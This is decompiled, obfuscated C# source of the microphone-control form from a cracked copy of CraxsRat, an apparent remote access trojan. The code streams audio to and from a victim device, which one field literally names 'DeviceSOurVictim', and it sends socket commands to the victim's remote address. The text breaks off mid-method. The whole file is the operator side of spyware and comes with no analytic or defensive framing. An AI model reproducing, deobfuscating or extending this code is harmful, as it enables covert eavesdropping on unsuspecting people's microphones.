// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Microphone
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using WinMM;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Microphone : Form
  {
    private List<Rectangle> RectInputText0;
    private IContainer components;
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;

    internal virtual Button bIN
    {
      get => ((Ports) this)._bIN;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.bIN_Click);
label_1:
        int num1 = 920343626;
        Button bIn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~-(num1 * -1809186931) * 146121703 ^ --315341733) - -594257137)) % 8U)
          {
            case 0:
              bIn.Click += eventHandler;
              num1 = (int) num2 * 536572830 ^ 1561054404;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              bIn = ((Ports) this)._bIN;
              num1 = (int) num2 * 848884772 ^ -1327194380;
              continue;
            case 4:
              bIn = ((Ports) this)._bIN;
              int num3 = bIn == null ? 2048682408 : (num3 = 891415295);
              num1 = num3 ^ (int) num2 * -15770281;
              continue;
            case 5:
              int num4 = bIn == null ? -1723481140 : (num4 = -806385833);
              num1 = num4 ^ (int) num2 * -1161446299;
              continue;
            case 6:
              ((Ports) this)._bIN = value;
              num1 = -934259209;
              continue;
            case 7:
              bIn.Click -= eventHandler;
              num1 = (int) num2 * 10543997 ^ 969761534;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Ports) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._Panel1 = value;
    }

    internal virtual Label Label2
    {
      get => ((Ports) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._Label2 = value;
    }

    internal virtual ComboBox OutHZ
    {
      get => ((Ports) this)._OutHZ;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._OutHZ = value;
    }

    internal virtual Label Label1
    {
      get => ((Ports) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Ports) this)._Label1 = value;
    }

    internal virtual ComboBox OutBoxSource
    {
      get => ((Ports) this)._OutBoxSource;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OutBoxSource_SelectedIndexChanged);
        ComboBox outBoxSource = ((Ports) this)._OutBoxSource;
        if (outBoxSource == null)
          goto label_8;
label_1:
        int num1 = -1624887371;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(-num1 * 843748977 * 1944625785) - 1730137950)) % 7U)
          {
            case 0:
              int num3 = outBoxSource == null ? -1054701526 : (num3 = 840166199);
              num1 = num3 ^ (int) num2 * 2133048463;
              continue;
            case 1:
              outBoxSource.SelectedIndexChanged += eventHandler;
              num1 = (int) num2 * -1181457411 ^ -778526141;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_8;
            case 4:
              outBoxSource = ((Ports) this)._OutBoxSource;
              num1 = (int) num2 * -451665150 ^ -1677140242;
              continue;
            case 5:
              goto label_3;
            case 6:
              outBoxSource.SelectedIndexChanged -= eventHandler;
              num1 = (int) num2 * 895933838 ^ -891612497;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((Ports) this)._OutBoxSource = value;
        num1 = 49633801;
        goto label_2;
      }
    }

    internal virtual Button b_sta
    {
      get => ((Ports) this)._b_sta;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.b_sta_Click);
label_1:
        int num1 = 1186125735;
        Button bSta;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 ^ (-1640846012 - 2131313220 - (-235047403 - 214222023) ^ (-761222921 ^ -607553208) + (1069149142 ^ -1395951630)) + (~--1523201989 + (-122847265 - 833323420) * -1198718617) - --(472324696 - 349265407 ^ -333994821)) ^ 875627875)) % 7U)
          {
            case 0:
              bSta.Click += eventHandler;
              num1 = (int) num2 * -330181192 ^ -575993164;
              continue;
            case 1:
              int num3 = bSta == null ? 1645551101 : (num3 = 735064378);
              num1 = num3 ^ (int) num2 * 731747865;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              bSta = ((Ports) this)._b_sta;
              num1 = (int) num2 * -491970212 ^ 1166935311;
              continue;
            case 5:
              bSta.Click -= eventHandler;
              num1 = (int) num2 * 331933449 ^ 1461936738;
              continue;
            case 6:
              ((Ports) this)._b_sta = value;
              bSta = ((Ports) this)._b_sta;
              int num4;
              num1 = num4 = bSta == null ? 1566056252 : (num4 = 1807183058);
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports.VB\u0024StateMachine_174_FadeIn) this)._Panel2 = value;
      }
    }

    internal virtual ComboBox DeviceSOurVictim
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._DeviceSOurVictim;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports.VB\u0024StateMachine_174_FadeIn) this)._DeviceSOurVictim = value;
      }
    }

    internal virtual Label Label3
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports.VB\u0024StateMachine_174_FadeIn) this)._Label3 = value;
      }
    }

    internal virtual ComboBox inHZ
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._inHZ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports.VB\u0024StateMachine_174_FadeIn) this)._inHZ = value;
      }
    }

    internal virtual ComboBox InBoxSource
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._InBoxSource;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.InBoxSource_SelectedIndexChanged);
label_1:
        int num1 = -1794543541;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ComboBox inBoxSource;
          switch ((num3 = (uint) (-1569071951 * 582086913 - (~-num2 - ((-1843843567 ^ -493956595 ^ --1731330366) + (633691331 - 2103117546 ^ -606679951 * 740914741)) - -1363027199 * (1561842439 - 1092543082)) - 343233590)) % 9U)
          {
            case 0:
              inBoxSource.SelectedIndexChanged -= eventHandler;
              num1 = (int) num3 * 433279418 ^ -273870619;
              continue;
            case 1:
              inBoxSource = ((Ports.VB\u0024StateMachine_174_FadeIn) this)._InBoxSource;
              num1 = (int) num3 * -1746096523 ^ 1387031248;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num4 = inBoxSource == null ? -1191213816 : (num4 = 478441547);
              num1 = num4 ^ (int) num3 * 1379196273;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num5 = inBoxSource == null ? -977340939 : (num5 = 649623649);
              num1 = num5 ^ (int) num3 * -870868336;
              continue;
            case 6:
              inBoxSource.SelectedIndexChanged += eventHandler;
              num1 = (int) num3 * 1342842331 ^ 1644683431;
              continue;
            case 7:
              ((Ports.VB\u0024StateMachine_174_FadeIn) this)._InBoxSource = value;
              num1 = 1379414645;
              continue;
            case 8:
              inBoxSource = ((Ports.VB\u0024StateMachine_174_FadeIn) this)._InBoxSource;
              num1 = (int) num3 * -1109586664 ^ 1122269659;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 1095443001;
        while (true)
        {
          int num2 = num1;
          uint num3;
          System.Windows.Forms.Timer topacity;
          switch ((num3 = (uint) (-966272357 - ((-~num2 ^ 845211876) + ((-1338472405 ^ -531444332) - (1028087220 - 2126151702))) * -535834941)) % 9U)
          {
            case 0:
              int num4 = topacity == null ? 1731316134 : (num4 = -172569395);
              num1 = num4 ^ (int) num3 * -349851812;
              continue;
            case 1:
              topacity = ((Ports.VB\u0024StateMachine_174_FadeIn) this)._TOpacity;
              num1 = (int) num3 * 1670050841 ^ -1692899356;
              continue;
            case 2:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * -575637154 ^ -101275010;
              continue;
            case 3:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * 496024882 ^ -1197003213;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num5 = topacity == null ? -846189295 : (num5 = -252388274);
              num1 = num5 ^ (int) num3 * 1365239116;
              continue;
            case 6:
              topacity = ((Ports.VB\u0024StateMachine_174_FadeIn) this)._TOpacity;
              num1 = (int) num3 * 233556274 ^ -1719513984;
              continue;
            case 7:
              goto label_3;
            case 8:
              ((Ports.VB\u0024StateMachine_174_FadeIn) this)._TOpacity = value;
              num1 = 687080281;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label LAB_ERR
    {
      get => ((Ports.VB\u0024StateMachine_174_FadeIn) this)._LAB_ERR;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports.VB\u0024StateMachine_174_FadeIn) this)._LAB_ERR = value;
      }
    }

    internal virtual TabControl TabControl1
    {
      get => ((Ports._Closure\u0024__227\u002D0) this)._TabControl1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__227\u002D0) this)._TabControl1 = value;
      }
    }

    internal virtual TabPage TabPage1
    {
      get => ((Ports._Closure\u0024__227\u002D1) this)._TabPage1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__227\u002D1) this)._TabPage1 = value;
      }
    }

    internal virtual TabPage TabPage2
    {
      get => ((Ports._Closure\u0024__) this)._TabPage2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__) this)._TabPage2 = value;
      }
    }

    internal virtual ImageList ImageList1
    {
      get => ((Ports._Closure\u0024__) this)._ImageList1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__) this)._ImageList1 = value;
      }
    }

    internal virtual Label Label5
    {
      get => ((Ports._Closure\u0024__) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__) this)._Label5 = value;
      }
    }

    internal virtual Label Label4
    {
      get => ((Ports._Closure\u0024__) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__) this)._Label4 = value;
      }
    }

    internal virtual DrakeUILampLED DrakeUILampLED1
    {
      get => ((Ports._Closure\u0024__) this)._DrakeUILampLED1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Ports._Closure\u0024__) this)._DrakeUILampLED1 = value;
      }
    }

    internal virtual Button Button1
    {
      get => ((Ports._Closure\u0024__) this)._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click_1);
        Button button1 = ((Ports._Closure\u0024__) this)._Button1;
        if (button1 == null)
          goto label_7;
label_1:
        int num1 = 1827337786;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * 803437603) ^ 356028911 * (1752501963 * -646070069) - --43879366)) % 7U)
          {
            case 0:
              int num3 = button1 == null ? 2072020430 : (num3 = -248186769);
              num1 = num3 ^ (int) num2 * -994530708;
              continue;
            case 1:
              button1.Click += eventHandler;
              num1 = (int) num2 * 619291644 ^ -1053063550;
              continue;
            case 2:
              button1.Click -= eventHandler;
              num1 = (int) num2 * -897726267 ^ -676984496;
              continue;
            case 3:
              goto label_7;
            case 4:
              goto label_1;
            case 5:
              button1 = ((Ports._Closure\u0024__) this)._Button1;
              num1 = (int) num2 * -964501462 ^ 121360864;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_7:
        ((Ports._Closure\u0024__) this)._Button1 = value;
        num1 = -1634735888;
        goto label_2;
      }
    }

    public virtual BackgroundWorker Bgworker
    {
      get => ((Ports._Closure\u0024__) this)._Bgworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.Worker_DoWork);
label_1:
        int num1 = -1085729777;
        BackgroundWorker bgworker;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-~(num1 + (-(1217529587 * 1869622434 + (-322443095 * -1253585877 ^ -1794871990)) + (~-640668446 - ~1177302434 - 310450513 ^ ~1622793673 ^ ~-1426685647 + -1175028033 * 532891521)))) % 7U)
          {
            case 0:
              ((Ports._Closure\u0024__) this)._Bgworker = value;
              num1 = -1191459281;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              bgworker.DoWork += workEventHandler;
              num1 = (int) num2 * 205059825 ^ 1101122560;
              continue;
            case 4:
              bgworker.DoWork -= workEventHandler;
              num1 = (int) num2 * 1381940000 ^ 844828629;
              continue;
            case 5:
              bgworker = ((Ports._Closure\u0024__) this)._Bgworker;
              int num3 = bgworker == null ? 1480279115 : (num3 = -731022546);
              num1 = num3 ^ (int) num2 * 1167282276;
              continue;
            case 6:
              bgworker = ((Ports._Closure\u0024__) this)._Bgworker;
              int num4 = bgworker == null ? 893129407 : (num4 = -2045631487);
              num1 = num4 ^ (int) num2 * -885136303;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public Microphone()
    {
      this.Load += new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd);
      this.Closing += new CancelEventHandler(this.Microphone_Closing);
      this.FormClosing += new FormClosingEventHandler(this.Microphone_FormClosing);
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__) this).waveOut = (WaveOut) null;
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__) this).Title = EXGuarder.\u0031D606951;
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__) this).bytes = new List<byte[]>();
      // ISSUE: reference to a compiler-generated field
      ((Ports._Closure\u0024__229\u002D0) this).isrecording = (object) false;
      ((LocationManager.Delegate0) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void translateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u0030C2A5348, false) == 0)
        goto label_6;
label_1:
      int num1 = 2014809813;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((--~1860192199 - (--(1143014607 * ~-593765972) - ~num2)) * 1707577663 ^ 307391248 ^ 1172612900)) % 14U)
        {
          case 0:
            this.bIN.Text = Codes.Translate(this.bIN.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            num1 = (int) num3 * 2126867432 ^ -1522686950;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_6;
          case 3:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            this.b_sta.Text = Codes.Translate(this.b_sta.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            num1 = (int) num3 * -1061381281 ^ 607189031;
            continue;
          case 4:
            this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            num1 = (int) num3 * 1252709355 ^ 177324056;
            continue;
          case 5:
            this.b_sta.Text = Codes.Translate(this.b_sta.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            num1 = (int) num3 * -1684026075 ^ -1323258814;
            continue;
          case 6:
            num1 = (int) num3 * -566090964 ^ 1992000059;
            continue;
          case 7:
            int num4 = Operators.CompareString(language, EXGuarder.\u00362316568, false) != 0 ? -1744058460 : (num4 = 1152391297);
            num1 = num4 ^ (int) num3 * -482117663;
            continue;
          case 8:
            this.TabControl1.TabPages[1].Text = Codes.Translate(this.TabControl1.TabPages[1].Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            num1 = (int) num3 * -1648048565 ^ -939554219;
            continue;
          case 9:
            this.bIN.Text = Codes.Translate(this.bIN.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            this.TabControl1.TabPages[0].Text = Codes.Translate(this.TabControl1.TabPages[0].Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            num1 = (int) num3 * -998580085 ^ 286151477;
            continue;
          case 10:
            this.Label3.Text = Codes.Translate(this.Label3.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            this.Label4.Text = Codes.Translate(this.Label4.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            this.Label5.Text = Codes.Translate(this.Label5.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            num1 = (int) num3 * -20235936 ^ -1878902847;
            continue;
          case 11:
            goto label_1;
          case 12:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003072A5B04);
            num1 = (int) num3 * 1897410488 ^ 1709669977;
            continue;
          case 13:
            this.Label2.Text = Codes.Translate(this.Label2.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
            num1 = (int) num3 * 1128422791 ^ -2086397123;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:
      return;
label_6:
      this.Label1.Text = Codes.Translate(this.Label1.Text, EXGuarder.\u0032B4C6F79, EXGuarder.\u003416F3B5B);
      num1 = -236807711;
      goto label_2;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = -305437329;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(-(num1 ^ -~1785895120) * 2081080487)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            this.Opacity += 0.1;
            num1 = (int) num2 * 1875111468 ^ 1668124738;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 284205610;
      goto label_2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasczxcawd(object sender, EventArgs e)
    {
      this.translateme();
label_1:
      int num1 = 1855737700;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~~(-1921899445 * ((-381818773 * -1670625443 + (-1119344534 - -42057497)) * 1667699113 - (1630120246 - -893351206 - 1963115884 * -520881247 - 751893757)) - num2 + (1268566307 * 1956247126 + (-(-1037388708 - 1295467473) - 280031865)) - ~---962624534) - 1901271484)) % 6U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            this.Text = ((Ports._Closure\u0024__) this).Title;
            num1 = (int) num3 * 1698295972 ^ 2084670999;
            continue;
          case 1:
            this.LoadDEVMicrophone();
            num1 = (int) num3 * -1522205875 ^ 890234765;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0030316706C);
            num1 = (int) num3 * -795366407 ^ -94127669;
            continue;
          case 5:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num3 * -994754508 ^ 639598864;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public void SizeH()
    {
      int num1 = 0;
      if (!this.Panel1.Visible)
        goto label_6;
label_1:
      int num2 = -2138492922;
label_2:
      while (true)
      {
        int num3 = num2;
        uint num4;
        int num5;
        switch ((num4 = (uint) (~((((1973258285 * -1282209434 ^ ~-1904401291 - 498964476) - -(--813391719 - (-1651785700 - 2093080274))) * -2020383865 - num3 + ((-1417731750 ^ -402801659 ^ 981622782 ^ 886948153 + 2110808815 ^ ~-1656744004) - -490961826) ^ -((1928629506 - 694514410) * -1993690663)) - -483275881) - 2004720086)) % 11U)
        {
          case 0:
            checked { num1 += this.Panel2.Height; }
            num2 = (int) num4 * 688320425 ^ -1020557684;
            continue;
          case 1:
            num1 = this.LAB_ERR.Height;
            num2 = (int) num4 * -651996918 ^ 551950764;
            continue;
          case 2:
            checked { num1 += this.Panel1.Height; }
            num2 = (int) num4 * 1114746961 ^ 6307393;
            continue;
          case 3:
            num5 = checked (this.Height - this.ClientSize.Height - 1);
            num2 = -1338216464;
            continue;
          case 4:
            this.Height = checked (num1 + num5);
            num2 = 1877531985;
            continue;
          case 5:
            int num6 = !(!this.Panel1.Visible & !this.Panel2.Visible) ? -467268307 : (num6 = 784987297);
            num2 = num6 ^ (int) num4 * 2052478955;
            continue;
          case 6:
            this.LAB_ERR.Visible = true;
            num2 = (int) num4 * 870472807 ^ 1850599067;
            continue;
          case 7:
            goto label_1;
          case 8:
            goto label_6;
          case 9:
            goto label_3;
          case 10:
            this.LAB_ERR.Text = EXGuarder.\u003645B4F70;
            num2 = (int) num4 * -2036339647 ^ 633903807;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_6:
      num2 = !this.Panel2.Visible ? 1282049040 : (num2 = 2139368747);
      goto label_2;
    }

    private void Microphone_Closing(object sender, CancelEventArgs e)
    {
      this.DrakeUILampLED1.Blink = false;
      this.DrakeUILampLED1.On = false;
label_1:
      int num1 = -803665482;
      object[] ParametersObjects;
      TcpClient client;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~-~((num1 ^ -(~-1049374688 + (1672828633 ^ -68157066) * 395126011) ^ 1462208924 * 233846057) * -827490217) ^ 1295932358)) % 17U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            int num3 = !Operators.ConditionalCompareObjectEqual(((Ports._Closure\u0024__229\u002D0) this).isrecording, (object) false, false) ? -106426355 : (num3 = 500052935);
            num1 = num3 ^ (int) num2 * -1692472382;
            continue;
          case 1:
            int num4;
            // ISSUE: reference to a compiler-generated field
            num1 = num4 = ((Ports._Closure\u0024__) this).waveOut == null ? 1994158195 : (num4 = -2114637044);
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__229\u002D0) this).isrecording = (object) false;
            num1 = (int) num2 * -1848908031 ^ -555058439;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((Ports._Closure\u0024__) this).classWaveOut).qit = true;
            num1 = (int) num2 * 1933628861 ^ -406589542;
            continue;
          case 4:
            int num5;
            // ISSUE: reference to a compiler-generated field
            num1 = num5 = ((Ports._Closure\u0024__) this).classWaveIn == null ? -75427314 : (num5 = 334239044);
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((Ports._Closure\u0024__) this).classClient).myClient;
            num1 = (int) num2 * -67338543 ^ -1000656712;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            int num6 = ((Ports._Closure\u0024__) this).classClient == null ? 1646545999 : (num6 = 761185725);
            num1 = num6 ^ (int) num2 * -2006893748;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).waveOut.Stop();
            num1 = (int) num2 * -155641732 ^ 664394211;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((Ports._Closure\u0024__) this).classWaveIn).qit = true;
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classWaveIn.Close(((Ports._Closure\u0024__) this).ClientWaveIn);
            num1 = (int) num2 * -374722227 ^ 760684682;
            continue;
          case 9:
            this.DrakeUILampLED1.Dispose();
            num1 = (int) num2 * 1533626523 ^ 138414735;
            continue;
          case 10:
            goto label_1;
          case 11:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classWaveOut.Close(((Ports._Closure\u0024__) this).ClientWaveOut);
            num1 = (int) num2 * -1412134620 ^ -636421119;
            continue;
          case 12:
            goto label_3;
          case 13:
            // ISSUE: reference to a compiler-generated field
            ((Ports._Closure\u0024__) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num2 * -1350860833 ^ 1921400461;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Craxs_Rat.sockets.Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003024F2F19 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030E464B32 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030E464B32 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Ports._Closure\u0024__) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00373562729),
              (object) ((Ports._Closure\u0024__) this).classClient
            };
            num1 = (int) num2 * 1382445127 ^ -412849783;
            continue;
          case 15:
            this.In_Stop();
            num1 = -523157550;
            continue;
          case 16:
            int num7;
            // ISSUE: reference to a compiler-generated field
            num1 = num7 = ((Ports._Closure\u0024__) this).classWaveOut == null ? -1776179179 : (num7 = 2042946727);
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:;
    }

    private void b_sta_Click(object sender, EventArgs e)
    {
      if (!Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, (object) 2, false))
        goto label_8;
label_1:
      int num1 = 734667018;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((((num1 ^ ~-636278911) + ~258907762 * 1394167355 ^ -1489951367 * -(765974353 - -1486264902) ^ 1382817475 * 2138194767 - (892274994 ^ 1854211583)) - ~-228152439) * 1509593883)) % 7U)
        {
          case 0:
            goto label_3;
          case 1:
            this.b_sta.Text = EXGuarder.\u0035C003635;
            num1 = (int) num2 * -1397514654 ^ -968297949;
            continue;
          case 2:
            this.b_sta.Tag = (object) 1;
            this.b_sta.Text = EXGuarder.\u003681C3877;
            this.Out_Start();
            num1 = (int) num2 * -1388582892 ^ 76383307;
            continue;
          case 3:
            this.b_sta.Tag = (object) 0;
            num1 = (int) num2 * -2023897432 ^ 1101356538;
            continue;
          case 4:
            goto label_8;
          case 5:
            this.Out_Stop();
            num1 = (int) num2 * 228759632 ^ 595505208;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_8:
      num1 = !Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, (object) 0, false) ? -1618697525 : (num1 = 270166502);
      goto label_2;
    }

    private void Out_Start()
    {
      // ISSUE: reference to a compiler-generated field
      if (((Ports._Closure\u0024__) this).classClient == null)
        return;
label_1:
      int num1 = -38102615;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string[] strArray;
        switch ((num3 = (uint) (1833705063 - ~((num2 * 115137283 - (599677269 - 209292774 + 1467488112 ^ -800561438 - -1506170544 - 955589525 ^ ~-(467123587 * 621912849))) * 93871417 ^ (-2062549366 ^ 2045235471) + ~1439966983))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
